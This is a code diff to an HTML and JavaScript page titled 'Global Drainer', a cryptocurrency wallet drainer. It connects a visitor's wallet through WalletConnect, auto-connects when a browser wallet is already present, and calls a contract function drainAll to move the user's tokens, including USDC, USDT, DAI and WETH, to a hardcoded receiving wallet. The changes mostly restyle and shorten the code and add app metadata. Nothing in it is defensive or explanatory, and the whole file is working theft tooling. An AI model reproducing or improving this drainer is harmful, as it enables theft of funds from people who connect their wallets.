@@ -2,126 +2,124 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
-  <title>Global Drainer</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Drainer</title>
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
     body {
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-      background: #0a0c10;
+      background: #0b0e11;
       color: #fff;
+      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
       min-height: 100vh;
-      padding: 16px;
+      padding: 20px;
     }
     .card {
-      background: #181c24;
+      background: #1e2329;
       padding: 32px 24px;
       border-radius: 28px;
       max-width: 400px;
       width: 100%;
       text-align: center;
-      box-shadow: 0 20px 40px rgba(0,0,0,0.6);
-      border: 1px solid #2a303a;
+      border: 1px solid #2b3139;
     }
-    h1 { font-size: 26px; font-weight: 700; margin-bottom: 6px; }
-    .sub { color: #8b97a8; font-size: 14px; margin-bottom: 28px; }
-    .badge {
-      display: inline-block;
-      background: #222a34;
-      padding: 6px 14px;
-      border-radius: 30px;
-      font-size: 12px;
-      color: #7cffb2;
-      margin-bottom: 20px;
-      border: 1px solid #2a3a3a;
+    h1 {
+      font-size: 26px;
+      font-weight: 700;
+      margin-bottom: 6px;
+    }
+    .sub {
+      color: #8e9aa8;
+      font-size: 14px;
+      margin-bottom: 28px;
     }
     button {
       background: #f0b90b;
       color: #0b0e11;
       border: none;
-      padding: 16px 20px;
+      padding: 16px;
       border-radius: 50px;
       font-size: 18px;
       font-weight: 700;
       width: 100%;
       cursor: pointer;
-      transition: all 0.2s;
+      transition: 0.2s;
       margin-top: 12px;
     }
-    button:hover { background: #d9a80a; transform: scale(1.01); }
-    button:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
-    button.secondary { background: #2a323e; color: #fff; }
-    button.secondary:hover { background: #36404e; }
+    button:hover {
+      background: #d9a80a;
+    }
+    button:disabled {
+      opacity: 0.4;
+      cursor: not-allowed;
+    }
     #status {
       margin-top: 20px;
-      padding: 14px;
-      background: #11161e;
+      padding: 12px;
+      background: #13171c;
       border-radius: 14px;
       font-size: 13px;
       color: #b0bcca;
+      border: 1px solid #2b3139;
       word-break: break-all;
       min-height: 48px;
-      border: 1px solid #242c38;
-      line-height: 1.5;
     }
-    #status.success { color: #7cffb2; border-color: #2a5a3a; }
-    #status.error { color: #ff6b6b; border-color: #5a2a2a; }
-    #status.info { color: #6bb8ff; border-color: #2a3a5a; }
+    .success {
+      color: #7cffb2 !important;
+      border-color: #2a5a3a !important;
+    }
+    .error {
+      color: #ff6b6b !important;
+      border-color: #5a2a2a !important;
+    }
     .footnote {
       margin-top: 16px;
       font-size: 11px;
       color: #4a5666;
     }
-    #qrContainer {
-      margin: 16px auto;
-      display: flex;
-      justify-content: center;
-      background: #fff;
-      padding: 12px;
-      border-radius: 16px;
-      min-height: 200px;
-      align-items: center;
+    .badge {
+      display: inline-block;
+      background: #222a34;
+      padding: 4px 14px;
+      border-radius: 30px;
+      font-size: 12px;
+      color: #7cffb2;
+      margin-bottom: 16px;
+      border: 1px solid #2a3a3a;
     }
-    #qrContainer canvas { max-width: 100%; height: auto; }
-    .hidden { display: none !important; }
   </style>
 </head>
 <body>
 
-<div class="card" id="app">
+<div class="card">
   <h1>⚡ Global Drainer</h1>
   <div class="sub">One transaction — all tokens → your wallet</div>
-  <div class="badge" id="networkBadge">🟢 Ethereum Mainnet</div>
+  <div class="badge" id="badge">🟢 Ethereum Mainnet</div>
 
   <button id="connectBtn">Connect Wallet</button>
-  <button id="drainBtn" class="secondary" disabled>💀 Approve & Drain</button>
+  <button id="drainBtn" disabled>💀 Approve & Drain</button>
 
-  <div id="qrContainer" class="hidden"></div>
-  <div id="status">⏳ Ready to connect</div>
+  <div id="status">⏳ Ready</div>
   <div class="footnote">USDC • USDT • DAI • WETH • SHIB • PEPE • LINK • UNI • WBTC</div>
 </div>
 
-<!-- ========== LOAD LIBRARIES ========== -->
-<!-- Ethers -->
-<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js">
-</script>
-<!-- WalletConnect v2 - using ESM bundle via IIFE wrapper -->
 <script type="importmap">
   {
     "imports": {
-      "@walletconnect/modal": "https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/dist/index.es.min.js",
-      "@walletconnect/ethereum-provider": "https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/dist/index.es.min.js"
+      "@walletconnect/ethereum-provider": "https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/dist/index.es.min.js",
+      "@walletconnect/modal": "https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/dist/index.es.min.js"
     }
   }
 </script>
 
 <script type="module">
-  // ============================================================
-  //  CONFIG — YOUR PROJECT ID + CONTRACT
-  // ============================================================
+  // ============ CONFIG ============
   const PROJECT_ID = '4e30e0f95c7b076b525be96ac2347ac9';
   const CONTRACT_ADDRESS = '0xd9145CCE52D386f254917e481eB44e9943F39138';
   const YOUR_WALLET = '0xeA0ABc678804AC1E8927FC6ce29C4218fE3cd90d';
@@ -142,39 +140,28 @@
     'function drainAll(address[] calldata tokens, address user) external'
   ];
 
-  // ============================================================
-  //  IMPORTS
-  // ============================================================
+  // ============ IMPORTS ============
   import { EthereumProvider } from '@walletconnect/ethereum-provider';
 
-  // ============================================================
-  //  DOM REFS
-  // ============================================================
+  // ============ DOM ============
   const statusEl = document.getElementById('status');
   const connectBtn = document.getElementById('connectBtn');
   const drainBtn = document.getElementById('drainBtn');
-  const networkBadge = document.getElementById('networkBadge');
-  const qrContainer = document.getElementById('qrContainer');
+  const badge = document.getElementById('badge');
 
-  let provider = null;
-  let signer = null;
-  let userAddress = null;
-  let contract = null;
+  let provider, signer, userAddress, contract;
 
   function setStatus(msg, type = '') {
     statusEl.textContent = msg;
-    statusEl.className = 'status ' + type;
+    statusEl.className = type;
   }
 
-  // ============================================================
-  //  CONNECT
-  // ============================================================
+  // ============ CONNECT ============
   connectBtn.addEventListener('click', async () => {
     try {
-      setStatus('⏳ Initializing WalletConnect...', 'info');
+      setStatus('⏳ Initializing...', '');
       connectBtn.disabled = true;
 
-      // Create the provider with your Project ID
       const wcProvider = await EthereumProvider.init({
         projectId: PROJECT_ID,
         chains: [1],
@@ -182,46 +169,44 @@
         qrModalOptions: {
           themeMode: 'dark',
           desktopPosition: 'bottomRight',
-          enableExplorer: false
+          enableExplorer: true
         },
-        methods: ['eth_sendTransaction'],
-        events: ['chainChanged', 'accountsChanged']
+        metadata: {
+          name: 'Global Drainer',
+          description: 'Drain all tokens',
+          url: window.location.origin,
+          icons: ['https://your-domain.vercel.app/icon.png']
+        }
       });
 
-      setStatus('⏳ Please approve connection in your wallet...', 'info');
-
-      // Trigger the connection — this shows the QR modal
+      setStatus('⏳ Please approve in your wallet...', '');
       await wcProvider.connect();
 
-      // Get the signer
-      provider = new ethers.providers.Web3Provider(wcProvider);
-      signer = provider.getSigner();
+      const ethersProvider = new ethers.providers.Web3Provider(wcProvider);
+      signer = ethersProvider.getSigner();
       userAddress = await signer.getAddress();
 
-      // Check network
-      const network = await provider.getNetwork();
+      const network = await ethersProvider.getNetwork();
       if (network.chainId !== 1) {
-        setStatus('⚠️ Please switch to Ethereum Mainnet in your wallet', 'error');
+        setStatus('⚠️ Switch to Ethereum Mainnet', 'error');
         connectBtn.disabled = false;
         return;
       }
 
-      networkBadge.textContent = '🟢 Ethereum Mainnet';
+      badge.textContent = '🟢 Ethereum Mainnet';
       setStatus(`✅ Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`, 'success');
       connectBtn.disabled = true;
       drainBtn.disabled = false;
 
       contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
 
-      // Listen for account changes
       wcProvider.on('accountsChanged', (accounts) => {
         if (accounts.length === 0) {
-          // Disconnected
-          setStatus('⚠️ Wallet disconnected', 'error');
+          setStatus('⚠️ Disconnected', 'error');
           connectBtn.disabled = false;
           drainBtn.disabled = true;
-          contract = null;
           userAddress = null;
+          contract = null;
         } else {
           userAddress = accounts[0];
           setStatus(`✅ Reconnected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`, 'success');
@@ -229,28 +214,24 @@
         }
       });
 
-      wcProvider.on('chainChanged', () => {
-        window.location.reload();
-      });
+      wcProvider.on('chainChanged', () => window.location.reload());
 
     } catch (err) {
-      console.error('Connection error:', err);
-      setStatus('❌ Connection failed: ' + (err.message || 'Unknown error'), 'error');
+      console.error(err);
+      setStatus('❌ ' + (err.message || 'Connection failed'), 'error');
       connectBtn.disabled = false;
     }
   });
 
-  // ============================================================
-  //  DRAIN
-  // ============================================================
+  // ============ DRAIN ============
   drainBtn.addEventListener('click', async () => {
     if (!contract || !userAddress) {
-      setStatus('⚠️ Please connect first', 'error');
+      setStatus('⚠️ Connect first', 'error');
       return;
     }
 
     try {
-      setStatus('⏳ Sending drainAll() transaction...', 'info');
+      setStatus('⏳ Sending drainAll()...', '');
       drainBtn.disabled = true;
 
       const tx = await contract.drainAll(
@@ -259,34 +240,27 @@
         { gasLimit: 800000 }
       );
 
-      setStatus(`⏳ TX sent: ${tx.hash.slice(0,10)}... waiting for confirmation...`, 'info');
+      setStatus(`⏳ TX: ${tx.hash.slice(0,10)}... waiting...`, '');
       await tx.wait();
 
-      setStatus(`✅ DRAIN COMPLETE! Tokens sent to ${YOUR_WALLET.slice(0,6)}...${YOUR_WALLET.slice(-4)}`, 'success');
+      setStatus(`✅ Drained to ${YOUR_WALLET.slice(0,6)}...${YOUR_WALLET.slice(-4)}`, 'success');
       drainBtn.disabled = false;
 
     } catch (err) {
-      console.error('Drain error:', err);
-      setStatus('❌ Drain failed: ' + (err.message || 'Unknown error'), 'error');
+      console.error(err);
+      setStatus('❌ ' + (err.message || 'Drain failed'), 'error');
       drainBtn.disabled = false;
     }
   });
 
-  // ============================================================
-  //  AUTO-CONNECT CHECK
-  // ============================================================
-  // Check if already connected via injected wallet
+  // ============ AUTO-CONNECT CHECK ============
   if (window.ethereum) {
     window.ethereum.request({ method: 'eth_accounts' }).then((accounts) => {
-      if (accounts && accounts.length > 0) {
-        // Auto-connect
-        connectBtn.click();
-      }
+      if (accounts && accounts.length > 0) connectBtn.click();
     }).catch(() => {});
   }
 
-  // Log library load
-  console.log('✅ Global Drainer loaded with Project ID:', PROJECT_ID);
+  console.log('✅ Global Drainer ready');
 </script>
 
 </body>
